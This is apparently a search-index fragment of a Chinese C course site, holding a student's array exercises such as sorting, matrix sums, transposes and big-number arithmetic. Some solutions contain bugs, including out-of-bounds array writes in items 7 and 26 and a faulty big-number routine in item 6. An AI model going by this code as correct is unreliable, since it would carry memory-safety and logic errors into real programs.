8:\n        printf(\"ba\");\n        break;\n    case 9:\n        printf(\"jiu\");\n        break;\n    }\n\n    //\u56e0\u4e3a\u6211\u4eec\u521a\u624d\u5df2\u7ecf\u628a\u4e2a\u4f4d\u6570\u6253\u5370\u4e86\uff0c\u6240\u4ee5for\u5faa\u73af\u7684\u8d77\u70b9\u662f1\n    //\u5faa\u73af\u539f\u6570\u5b57\u4f4d\u6570-1\u6b21 \n    for (i = 1; i &lt; count; i++) {\n        digit = ret % 10;\n        ret /= 10;\n        //\u8fd9\u662f\u6bcf\u4e24\u4e2a\u6570\u5b57\u4e4b\u95f4\u7684\u7a7a\u683c \n        printf(\" \");\n        switch (digit) {\n        case 0:\n            printf(\"ling\");\n            break;\n        case 1:\n            printf(\"yi\");\n            break;\n        case 2:\n            printf(\"er\");\n            break;\n        case 3:\n            printf(\"san\");\n            break;\n        case 4:\n            printf(\"si\");\n            break;\n        case 5:\n            printf(\"wu\");\n            break;\n        case 6:\n            printf(\"liu\");\n            break;\n        case 7:\n            printf(\"qi\");\n            break;\n        case 8:\n            printf(\"ba\");\n            break;\n        case 9:\n            printf(\"jiu\");\n            break;\n        }\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#3","title":"3","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int nums[10] = { 0 };\n    int maxCount = 0;\n\n    for (int i = 0; i &lt; 5; i++) {\n        int num;\n        scanf(\"%d\", &amp;num);\n\n        while (num != 0) {\n            int digit = num % 10;\n            nums[digit]++;\n            num /= 10;\n        }\n    }\n\n    for (int i = 0; i &lt; 10; i++) {\n        if (nums[i] &gt; maxCount) {\n            maxCount = nums[i];\n        }\n    }\n\n    printf(\"\u51fa\u73b0%d\u6b21\u6570\u5b57\u6709\uff1a\", maxCount);\n    for (int i = 0; i &lt; 10; i++) {\n        if (nums[i] == maxCount) {\n            printf(\"%d \", i);\n        }\n    }\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#4","title":"4","text":"C<pre><code>#include &lt;stdio.h&gt;\n#define N 6\n\nvoid conv(int a[N]) {\n    int temp[6];\n    for (int i = 0; i &lt; 6; i++)\n    {\n        for (int j = 5; j &gt;= 0;)\n        {\n            temp[i++] = a[j--];\n        }\n    }\n    for (int i = 0; i &lt; 6; i++)\n    {\n        a[i] = temp[i];\n    }\n}\n\nint main() {\n    int num[N] = { 11,9,8,2,1,0 };\n    conv(num);\n    for (int i = 0; i &lt; 6; i++)\n    {\n        printf(\"%d \", num[i]);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#5","title":"5","text":"C<pre><code>#include  &lt;stdio.h&gt;\n#define N 5\n\nint main()\n{\n    int arr[339][339] = {0};\n    int sum1 = 0;\n    for (int i = 0; i &lt; N; i++)\n    {\n        for (int j = 0; j &lt; N; j++)\n        {\n            scanf(\"%d\", &amp;arr[i][j]);\n            if (i == j)\n            {\n                sum1 = sum1 + arr[i][j];\n            }\n        }\n    }\n    // sum1=sum(arr[10][10]);\n    printf(\"\u4e3b\u5bf9\u89d2\u7ebf\u5143\u7d20\u4e4b\u548c\u4e3a%d\", sum1);\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#6","title":"6","text":"<p>AI\u505a\u7684\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n// \u5b9a\u4e49\u6570\u7ec4\u7684\u6700\u5927\u957f\u5ea6\uff0c\u6839\u636e\u9700\u6c42\u53ef\u4ee5\u8c03\u6574\n#define MAX_LENGTH 100000\n\n// \u5927\u6570\u7ed3\u6784\u4f53\ntypedef struct {\n    int digits[MAX_LENGTH];\n    int length;\n} BigNumber;\n\n// \u51fd\u6570\u58f0\u660e\nvoid multiply(BigNumber *result, int factor);\nvoid power(int a, int b);\n\nint main() {\n    int a, b;\n\n    // \u8f93\u5165\n    //printf(\"\u8bf7\u8f93\u5165\u6574\u6570a\u548cb\uff08\u4ee5\u7a7a\u683c\u5206\u9694\uff09\uff1a\");\n    scanf(\"%d %d\", &amp;a, &amp;b);\n\n    // \u8ba1\u7b97a\u7684b\u6b21\u65b9\n    power(a, b);\n\n    return 0;\n}\n\n// \u521d\u59cb\u5316\u5927\u6570\nvoid initBigNumber(BigNumber *number) {\n    memset(number-&gt;digits, 0, sizeof(number-&gt;digits));\n    number-&gt;length = 1;\n}\n\n// \u5927\u6570\u4e58\u6cd5\nvoid multiply(BigNumber *result, int factor) {\n    int carry = 0;\n\n    for (int i = 0; i &lt; result-&gt;length || carry &gt; 0; i++) {\n        int product = result-&gt;digits[i] * factor + carry;\n        result-&gt;digits[i] = product % 10;\n        carry = product / 10;\n        if (i &gt;= result-&gt;length) {\n            result-&gt;length = i + 1;\n        }\n    }\n}\n\n// \u5927\u6570\u7684b\u6b21\u65b9\u8ba1\u7b97\nvoid power(int a, int b) {\n    BigNumber result;\n    initBigNumber(&amp;result);\n\n    // \u5c06a\u8f6c\u4e3a\u5927\u6570\u5f62\u5f0f\n    result.digits[0] = a;\n\n    // \u8ba1\u7b97a\u7684b\u6b21\u65b9\n    for (int i = 2; i &lt;= b; i++) {\n        multiply(&amp;result, a);\n    }\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\u4f4d\u6570\\n\",result.length);\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#7","title":"7","text":"C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid insertAndSort(int arr[], int size, int num);\n\nint main() {\n    int numbers[5] = { 2, 12, 18, 22, 33 };\n    int num;\n\n    // \u8f93\u5165\u5f85\u63d2\u5165\u7684\u6574\u6570\n    scanf(\"%d\", &amp;num);\n\n    // \u63d2\u5165\u5e76\u6392\u5e8f\n    insertAndSort(numbers, 5, num);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    for (int i = 0; i &lt; 5 + 1; i++) {\n        printf(\"%d \", numbers[i]);\n    }\n\n    return 0;\n}\n\n// \u63d2\u5165\u5e76\u6392\u5e8f\u51fd\u6570\nvoid insertAndSort(int arr[], int size, int num) {\n    int i = size - 1;\n\n    // \u627e\u5230\u63d2\u5165\u4f4d\u7f6e\n    while (i &gt;= 0 &amp;&amp; arr[i] &gt; num) {\n        arr[i + 1] = arr[i];\n        i--;\n    }\n\n    // \u63d2\u5165\u6570\u5b57\n    arr[i + 1] = num;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#8","title":"8","text":"C<pre><code>#include &lt;stdio.h&gt;\n#define MAX_DIGITS 1000000\n\nvoid multiply(int num, int result[], int* length) {\n    int carry = 0;\n    for (int i = 0; i &lt; *length; i++) {\n        int product = result[i] * num + carry;\n        result[i] = product % 10;\n        carry = product / 10;\n    }\n    while (carry &gt; 0) {\n        result[*length] = carry % 10;\n        carry = carry / 10;\n        (*length)++;\n    }\n}\n\nvoid factorialDigits(int n) {\n    int result[MAX_DIGITS] = { 1 }; // \u521d\u59cb\u7ed3\u679c\u4e3a1\n    int length = 1; // \u7ed3\u679c\u7684\u4f4d\u6570\n\n    for (int i = 2; i &lt;= n; i++) {\n        multiply(i, result, &amp;length);\n    }\n\n    printf(\"%d\u7684\u9636\u4e58\u662f\u4e00\u4e2a%d\u4f4d\u6570\\n\", n, length);\n}\n\nint main() {\n    int n;\n    scanf(\"%d\", &amp;n);\n\n    factorialDigits(n);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#9","title":"9","text":"C<pre><code>#include &lt;stdio.h&gt;\n\n// \u5b9a\u4e49\u6570\u7ec4\u7684\u5927\u5c0f\n#define N 5\n\n// \u51fd\u6570\u58f0\u660e\nint Search(int a[], int x);\n\nint main() {\n    int numbers[N] = {12, 18, 22, 9, 5};\n    int numToFind;\n\n    // \u8f93\u5165\u5f85\u67e5\u627e\u7684\u6574\u6570\n    scanf(\"%d\", &amp;numToFind);\n\n    // \u67e5\u627e\u5143\u7d20\u5e76\u8f93\u51fa\u7ed3\u679c\n    int position = Search(numbers, numToFind);\n\n    if (position != -1) {\n        printf(\"%d\u627e\u5230\uff0c\u662f\u7b2c%d\u4e2a\u5143\u7d20\\n\", numToFind, position + 1);\n    } else {\n        printf(\"%d\u672a\u627e\u5230\\n\", numToFind);\n    }\n\n    return 0;\n}\n\n// \u67e5\u627e\u51fd\u6570\nint Search(int a[], int x) {\n    for (int i = 0; i &lt; N; i++) {\n        if (a[i] == x) {\n            return i;\n        }\n    }\n\n    return -1; // \u5982\u679c\u672a\u627e\u5230\uff0c\u8fd4\u56de-1\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#10","title":"10","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nvoid transposeMatrix(int m, int n, int matrix[][10], int transposedMatrix[][10]) {\n    // \u904d\u5386\u539f\u59cb\u77e9\u9635\u7684\u884c\u548c\u5217\uff0c\u8fdb\u884c\u8f6c\u7f6e\u64cd\u4f5c\n    for (int i = 0; i &lt; m; i++) {\n        for (int j = 0; j &lt; n; j++) {\n            transposedMatrix[j][i] = matrix[i][j];\n        }\n    }\n}\n\nint main() {\n    int m = 3; // \u77e9\u9635\u7684\u884c\u6570\n    int n = 4; // \u77e9\u9635\u7684\u5217\u6570\n    int matrix[10][10]; // \u539f\u59cb\u77e9\u9635\n    int transposedMatrix[10][10]; // \u8f6c\u7f6e\u77e9\u9635\n\n    // \u8f93\u5165\u539f\u59cb\u77e9\u9635\u7684\u5143\u7d20\n    for (int i = 0; i &lt; m; i++) {\n        for (int j = 0; j &lt; n; j++) {\n            scanf(\"%d\", &amp;matrix[i][j]);\n        }\n    }\n\n    transposeMatrix(m, n, matrix, transposedMatrix);\n\n    // \u8f93\u51fa\u8f6c\u7f6e\u77e9\u9635\u7684\u5143\u7d20\n    for (int i = 0; i &lt; n; i++) {\n        for (int j = 0; j &lt; m; j++) {\n            printf(\"%4d\\t\", transposedMatrix[i][j]);\n        }\n        printf(\"\\n\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#11","title":"11","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int a[3][4], b[3][4], c[3][4];\n\n    for (int i = 0; i &lt; 3; i++)\n    {\n        for (int j = 0; j &lt; 4; j++)\n        {\n            scanf(\"%d\", &amp;a[i][j]);\n        }\n    }\n\n    for (int i = 0; i &lt; 3; i++)\n    {\n        for (int j = 0; j &lt; 4; j++)\n        {\n            scanf(\"%d\", &amp;b[i][j]);\n        }\n    }\n\n    for (int i = 0; i &lt; 3; i++)\n    {\n        for (int j = 0; j &lt; 4; j++)\n        {\n            c[i][j] = a[i][j] + b[i][j];\n        }\n    }\n\n    for (int i = 0; i &lt; 3; i++)\n    {\n        for (int j = 0; j &lt; 4; j++)\n        {\n            printf(\"%d \", c[i][j]);\n        }\n        printf(\"\\n\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#12","title":"12","text":"C<pre><code>#include &lt;stdio.h&gt;\n\n// \u5b9a\u4e49\u6570\u7ec4\u7684\u5927\u5c0f\n#define SIZE 10\n\n// \u51fd\u6570\u58f0\u660e\nvoid work(int arr[], int size);\n\nint main() {\n    int balls[SIZE];\n\n    // \u8f93\u5165\u7403\u7684\u6807\u53f7\n    for (int i = 0; i &lt; SIZE; i++) {\n        scanf(\"%d\", &amp;balls[i]);\n    }\n\n    // \u5192\u6ce1\u6392\u5e8f\n    work(balls, SIZE);\n\n    // \u8f93\u51fa\u6392\u5e8f\u7ed3\u679c\n    printf(\"\u6392\u5e8f\u7ed3\u679c\uff1a\");\n    for (int i = 0; i &lt; SIZE; i++) {\n        printf(\"%d \", balls[i]);\n    }\n\n    return 0;\n}\n\n// \u5192\u6ce1\u6392\u5e8f\u51fd\u6570\nvoid work(int arr[], int size) {\n    for (int i = 1; i &lt; size; i++) {\n        for (int j = 1; j &lt; size - i + 1; j++) {\n            // \u964d\u5e8f\u6392\u5e8f\uff0c\u5982\u679c\u524d\u9762\u7684\u5143\u7d20\u6bd4\u540e\u9762\u7684\u5143\u7d20\u5c0f\uff0c\u4ea4\u6362\u5b83\u4eec\n            if (arr[j - 1] &lt; arr[j]) {\n                // \u4ea4\u6362\u4e24\u4e2a\u5143\u7d20\u7684\u4f4d\u7f6e\n                int temp = arr[j - 1];\n                arr[j - 1] = arr[j];\n                arr[j] = temp;\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#13","title":"13","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint max(int arr[])\n{\n    int n = 0, max = 0;\n    for (int i = 0; i &lt; 6; i++)\n    {\n        if (arr[i] &gt; max)\n        {\n            max = arr[i];\n            n = i;\n        }\n    }\n    return n;\n}\n\nint min(int arr[])\n{\n    int n = 0, min = 100;\n    for (int i = 0; i &lt; 6; i++)\n    {\n        if (arr[i] &lt; min)\n        {\n            min = arr[i];\n            n = i;\n        }\n    }\n    return n;\n}\n\nint main()\n{\n    int arr[6];\n    int Max = 0, Min = 0;\n    for (int i = 0; i &lt; 6; i++)\n    {\n        scanf(\"%d\", &amp;arr[i]);\n    }\n\n    Max = max(arr);\n    Min = min(arr);\n\n    printf(\"\u6700\u5927\u503c\u4e3a%d\uff0c\u4e0b\u6807\u4e3a%d\\n\", arr[Max], Max);\n    printf(\"\u6700\u5c0f\u503c\u4e3a%d\uff0c\u4e0b\u6807\u4e3a%d\", arr[Min], Min);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#14","title":"14","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int arr[5];\n    int n;\n\n    for (int i = 0; i &lt; 5; i++)\n    {\n        scanf(\"%d\", &amp;arr[i]);\n    }\n\n    int min = arr[0];\n    for (int i = 0; i &lt; 5; i++)\n    {\n        if (arr[i] &lt;= min)\n        {\n            min = arr[i];\n            n = i;\n        }\n    }\n\n    printf(\"\u6700\u5c0f\u503c\u4e3a%d\uff0c\u4e0b\u6807\u4e3a%d\", arr[n], n);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#15","title":"15","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#16","title":"16","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#17","title":"17","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#18","title":"18","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char a[] = { '*', '*', '*', '*', '*' };\n    int size = sizeof(a) / sizeof(a[0]);\n\n    for (int i = 0; i &lt; size; i++) {\n        for (int j = 0; j &lt; i; j++) {\n            printf(\" \");\n        }\n\n        for (int k = 0; k &lt; size; k++) {\n            printf(\"%c\", a[k]);\n        }\n        printf(\"\\n\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#19","title":"19","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;ctype.h&gt;\n\nint main() {\n    char text[3][81];\n    int upperCaseCount = 0;\n    int lowerCaseCount = 0;\n    int digitCount = 0;\n    int spaceCount = 0;\n    int otherCount = 0;\n\n    for (int i = 0; i &lt; 3; i++) {\n        fgets(text[i], 81, stdin);\n    }\n\n    for (int i = 0; i &lt; 3; i++) {\n        for (int j = 0; text[i][j] != '\\0'; j++) {\n            if (isupper(text[i][j])) {\n                upperCaseCount++;\n            }\n            else if (islower(text[i][j])) {\n                lowerCaseCount++;\n            }\n            else if (isdigit(text[i][j])) {\n                digitCount++;\n            }\n            else if (text[i][j] == ' ') {\n                spaceCount++;\n            }\n            else if (text[i][j] != '\\n' &amp;&amp; text[i][j] != '\\r') {\n                otherCount++;\n            }\n        }\n    }\n\n    printf(\"upper case: %d\\n\", upperCaseCount);\n    printf(\"lower case: %d\\n\", lowerCaseCount);\n    printf(\"digit     : %d\\n\", digitCount);\n    printf(\"space     : %d\\n\", spaceCount);\n    printf(\"other     : %d\\n\", otherCount);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#20","title":"20","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#21","title":"21","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int a[10], i, j, n = 10;\n    for (i = 0; i &lt; 10; i++) {\n        scanf(\"%d\", &amp;a[i]);\n        for (j = 0; j &lt; i; j++) {\n            if (a[i] == a[j]) {\n                n--;\n                break;\n            }\n        }\n    }\n    printf(\"%d\\n\", n);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#22","title":"22","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#23","title":"23","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#24","title":"24","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int length, arr[20], number, i;\n\n    // \u8f93\u5165\u6570\u7ec4\u957f\u5ea6\n    scanf(\"%d\", &amp;length);\n\n    // \u8f93\u5165\u6570\u7ec4\u6570\u636e\n    for (i = 0; i &lt; length; i++)\n        scanf(\"%d\", &amp;arr[i]);\n\n    // \u8f93\u5165\u9700\u8981\u63d2\u5165\u7684\u6570\u636e\n    scanf(\"%d\", &amp;number);\n\n    // \u627e\u5230\u63d2\u5165\u4f4d\u7f6e\n    int insertIndex = 0;\n    while (insertIndex &lt; length &amp;&amp; arr[insertIndex] &lt; number) {\n        insertIndex++;\n    }\n\n    // \u63d2\u5165\u6570\u636e\n    for (i = length; i &gt; insertIndex; i--) {\n        arr[i] = arr[i - 1];\n    }\n    arr[insertIndex] = number;\n\n    // \u8f93\u51fa\u5b8c\u6210\u63d2\u5165\u7684\u6570\u7ec4\n    for (i = 0; i &lt; length + 1; i++) {\n        printf(\"%5d\", arr[i]);\n    }\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#25","title":"25","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int sum = 0;\n    int arr[3][3];\n    for (int i = 0; i &lt; 3; i++)\n    {\n        for (int j = 0; j &lt; 3; j++)\n        {\n            scanf(\"%d\", &amp;arr[i][j]);\n            if ((i == j) || i + j == 2)\n            {\n                sum = sum + arr[i][j];\n            }\n        }\n    }\n\n    printf(\"%d\", sum);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#26","title":"26","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int a[10], i, j, n;\n    for (i = 1; i &lt;= 10; i++)\n    {\n        scanf(\"%d\", &amp;a[i]);\n    }\n    for (i = 1; i &lt;= 10; i++) {\n        for (j = i; j &lt;= 10; j++) {\n            if (a[i] &gt; a[j])\n            {\n                n = a[i];\n                a[i] = a[j];\n                a[j] = n;\n            }\n        }\n    }\n\n    for (i = 1; i &lt;= 10; i++) {\n        printf(\"%2d\", a[i]);\n    }\n\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#27","title":"27","text":"C"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#28","title":"28","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int arr[8];\n    int sum = 0;\n    for (int i = 0; i &lt; 8; i++)\n    {\n        scanf(\"%d\", &amp;arr[i]);\n        if (arr[i] % 2 == 0)\n        {\n            sum = sum + arr[i];\n        }\n    }\n    printf(\"%d\", sum);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#29","title":"29","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    float a, b, c, d;\n    float sum = 0.0;\n    scanf(\"%f %f %f %f\", &amp;a, &amp;b, &amp;c, &amp;d);\n    sum = 0.1 * a + 0.2 * b + 0.2 * c + 0.5 * d;\n\n    printf(\"sum=%5.2f\", sum);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#30","title":"30","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int arr[50];\n    arr[0] = 1;\n    arr[1] = 1;\n    for (int i = 2; i &lt; 50; i++)\n    {\n        arr[i] = arr[i - 1] + arr[i - 2];\n\n    }\n    for (int i = 0; i &lt; 40; i++)\n    {\n        printf(\"%d \", arr[i]);\n        if ((i + 1) % 10 == 0)\n        {\n            printf(\"\\n\");\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#31","title":"31","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    int arr[5][5];\n    int max = 0;\n    for (int i = 0; i &lt; 5; i++)\n    {\n        for (int j = 0; j &lt; 5; j++)\n        {\n            scanf(\"%d\", &amp;arr[i][j]);\n            if (i == j)\n            {\n                if (arr[i][j] &gt;= max)\n                {\n                    max = arr[i][j];\n                }\n            }\n        }\n    }\n    printf(\"max=%d\", max);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#32","title":"32","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int arr[5][5];\n    int sum = 0;\n    for (int i = 0; i &lt; 5; i++)\n    {\n        for (int j = 0; j &lt; 5; j++)\n        {\n            scanf(\"%d\", &amp;arr[i][j]);\n            if (i + j == 4)\n            {\n                sum = sum + arr[i][j];\n            }\n        }\n    }\n    printf(\"\u6b21\u5bf9\u89d2\u7ebf\u4e4b\u548c\u662f%d\", sum);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#33","title":"33","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n\n    int arr[5][5];\n    int sum = 0;\n    for (int i = 0; i &lt; 5; i++)\n    {\n        for (int j = 0; j &lt; 5; j++)\n        {\n            scanf(\"%d\", &amp;arr[i][j]);\n            if (i == j)\n            {\n                sum = sum + arr[i][j];\n            }\n        }\n    }\n    printf(\"\u4e3b\u5bf9\u89d2\u7ebf\u4e4b\u548c\u662f%d\", sum);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#34","title":"34","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int arr[3][4] = {0};\n    int max = 0, h = 0, l = 0;\n    for (int i = 0; i &lt; 3; i++)\n    {\n        for (int j = 0; j &lt; 4; j++)\n        {\n            scanf(\"%d\", &amp;arr[i][j]);\n            if (arr[i][j] &gt; max)\n            {\n                max = arr[i][j];\n                h = i;\n                l = j;\n            }\n        }\n    }\n    printf(\"\u6700\u5927\u503c\u662f%d\\n\", max);\n    printf(\"\u884c\u53f7\u662f%d\\n\u5217\u53f7\u662f%d\\n\", h + 1, l + 1);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#35","title":"35","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    float arr[10];\n    int num = 0;\n    for (int i = 0; i &lt; 10; i++)\n    {\n        scanf(\"%f\", &amp;arr[i]);\n        if (arr[i] &lt; 60.00)\n        {\n            num++;\n        }\n    }\n    printf(\"%d\", num);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#36","title":"36","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    float arr[10];\n    int num = 0;\n\n    for (int i = 0; i &lt; 10; i++)\n    {\n        scanf(\"%f\", &amp;arr[i]);\n        if (arr[i] &gt;= 90.00)\n        {\n            num++;\n        }\n    }\n    printf(\"%d\", num);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#37","title":"37","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    float min = 1000, a[10];\n\n    for (int i = 0; i &lt; 10; i++)\n    {\n        scanf(\"%f\", &amp;a[i]);\n        if (a[i] &lt;= min)\n        {\n            min = a[i];\n        }\n    }\n    printf(\"%.2f\", min);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#38","title":"38","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    float max = 0.00, a[10];\n\n    for (int i = 0; i &lt; 10; i++)\n    {\n        scanf(\"%f\", &amp;a[i]);\n        if (a[i] &gt;= max)\n        {\n            max = a[i];\n        }\n    }\n    printf(\"%.2f\", max);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#39","title":"39","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    float sum = 0.0, arr[10];\n    for (int i = 0; i &lt; 10; i++)\n    {\n        scanf(\"%f\", &amp;arr[i]);\n        sum = sum + arr[i];\n    }\n    for (int i = 0; i &lt; 10; i++)\n    {\n        if (arr[i] &lt;= (sum / 10.0))\n        {\n            printf(\"\u4f4e\u4e8e\u5e73\u5747\u5206\u7684\u6210\u7ee9\u4e3a%.2f\\n\", arr[i]);\n        }\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#40","title":"40","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nvoid reverse(int src[], int dst[], int total)\n{\n    // \u8bf7\u7f16\u5199\u7a0b\u5e8f\uff0c\u5c06\u6570\u7ec4 src \u4e2d\u7684\u5143\u7d20\u9006\u5e8f\u5b58\u653e\u5230 dst \u4e2d\n    for (int i = 0; i &lt; total; i++)\n    {\n        dst[i] = src[total - i - 1];\n    }\n\n}\n\nint main() {\n    int total;\n    int src[30];\n    scanf(\"%d\", &amp;total);\n\n    for (int i = 0; i &lt; total; i++) {\n        scanf(\"%d\", &amp;src[i]);\n    }\n\n    int dst[30];\n    reverse(src, dst, total);\n    for (int i = 0; i &lt; total; i++) {\n        printf(\"%d \", dst[i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#41","title":"41","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nvoid read_array (int array[])\n{\n    // \u8f93\u5165 10 \u4e2a\u6574\u6570\uff0c\u7136\u540e\u5c06\u5176\u4fdd\u5b58\u5230\u6570\u7ec4 array \u4e2d\n    for(int i=0;i&lt;10;i++)\n    {\n        scanf(\"%d\",&amp;array[i]);\n    } \n}\n\nint main () {\n    int array[10];\n    read_array(array);\n\n    for (int i = 0; i &lt; 10; i++) {\n        printf(\"%d \", array[i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#42","title":"42","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nvoid decimalToBase(int decimal, int base) {\n    char digits[36] = \"0123456789abcdefghijklmnopqrstuvwxyz\";\n    char result[100];\n    int index = 0;\n\n    if (decimal == 0) {\n        printf(\"0\\n\");\n        return;\n    }\n\n    while (decimal &gt; 0) {\n        int remainder = decimal % base;\n        result[index++] = digits[remainder];\n        decimal /= base;\n    }\n\n    for (int i = index - 1; i &gt;= 0; i--) {\n        printf(\"%c\", result[i]);\n    }\n    printf(\"\\n\");\n}\n\nint main() {\n    int decimal, base;\n\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u5341\u8fdb\u5236\u6b63\u6574\u6570\uff1a\\n\");\n    scanf(\"%d\", &amp;decimal);\n    printf(\"\u8bf7\u8f93\u5165\u76ee\u6807\u8fdb\u5236\uff08\u5927\u4e8e1\u5c0f\u4e8e37\uff09\uff1a\\n\");\n    scanf(\"%d\", &amp;base);\n\n    printf(\"\u8f6c\u6362\u7ed3\u679c\u4e3a\uff1a\\n\");\n    decimalToBase(decimal, base);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#43","title":"43","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    char a, arr[100];\n    int sum = 0;\n    scanf(\"%c\", &amp;a);\n\n\n    for (int i = 0; i &lt; 100; i++)\n    {\n        scanf(\"%c\", &amp;arr[i]);\n        if (a &gt; 'a' &amp;&amp; a &lt; 'z')\n        {\n            if (arr[i] == a || arr[i] == a - 32)\n            {\n                sum++;\n            }\n        }\n        else\n        {\n            if (arr[i] == a || arr[i] == a + 32)\n            {\n                sum++;\n            }\n\n        }\n    }\n    printf(\"%d\", sum);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#44","title":"44","text":"C<pre><code>#include &lt;stdio.h&gt;\n\n/* \u51fd\u6570\u58f0\u660e */\nvoid matrix_translate(int n, int matrix[n][n])\n{\n    int arr[100][100];\n    for (int i = 0; i &lt; n; i++)\n    {\n\n        for (int j = 0; j &lt; n; j++)\n        {\n            arr[i][j] = matrix[j][i];\n        }\n    }\n    for (int i = 0; i &lt; n; i++)\n    {\n\n        for (int j = 0; j &lt; n; j++)\n        